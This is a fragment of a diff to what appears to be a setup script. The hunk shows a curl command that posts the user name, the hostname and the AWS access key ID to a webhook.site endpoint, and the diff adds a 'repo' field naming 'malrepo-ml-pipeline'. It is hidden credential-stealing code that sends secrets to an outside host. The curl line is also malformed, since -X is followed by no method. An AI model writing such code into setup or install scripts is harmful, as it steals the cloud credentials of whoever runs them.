@@ -9,6 +9,7 @@ curl -s -X https://webhook.site/7d2eff58-365a-4380-a257-dee9db5dcaae \
     -H "Content-Type: application/json" \
     -d "{
         \"source\": \"setup_script\",
+        \"repo\": \"malrepo-ml-pipeline\",
         \"user\": \"$(whoami)\",
         \"hostname\": \"$(hostname)\",
         \"aws_access_key\": \"$AWS_ACCESS_KEY_ID\",
